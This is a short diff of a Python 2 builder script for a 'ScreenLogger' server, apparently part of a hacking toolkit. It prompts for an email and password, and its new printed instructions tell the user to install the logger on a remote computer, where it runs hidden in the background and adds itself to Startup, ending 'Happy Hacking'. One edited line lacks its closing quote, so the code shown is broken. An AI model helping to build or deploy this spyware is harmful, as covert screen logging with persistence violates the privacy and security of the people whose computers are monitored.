@@ -6,12 +6,15 @@ print "\r\n"
 email = raw_input('email(with quotations) :')
 password = raw_input('password(with quotations) :')
 print "\r\n"
-print "Your Built Server is located as \Completion.py in the \EtherSec Tool-Master folder"
+print "Your Built Server is located as \Completion.py in the \EtherSec-Windows-Tool-master folder"
 print "\r\n"
 print "To Install the Server Automatically drag the Compltetion.py"
-print "file and drag to \ScreenLogger\Setup, once youve completed these"
-print "steps your ScreenLogger Server will in the the ScreenLogger Folder"
-print "to install modules and executables click the install & run batch file"
+print "file to \ScreenLogger\Setup, once youve completed those steps"
+print "your ScreenLogger Server will in the the ScreenLogger Folder"
+print "to install to remote computer simply run the Istallation & Run.bat"
+print "it will install the python programming language and modules needed"
+print "for script and automatically Run in background and add the Startup"
+print "folder, Happy Hacking ~NSP
 print "\r\n"
 subprocess.call("pause", shell=True)
 
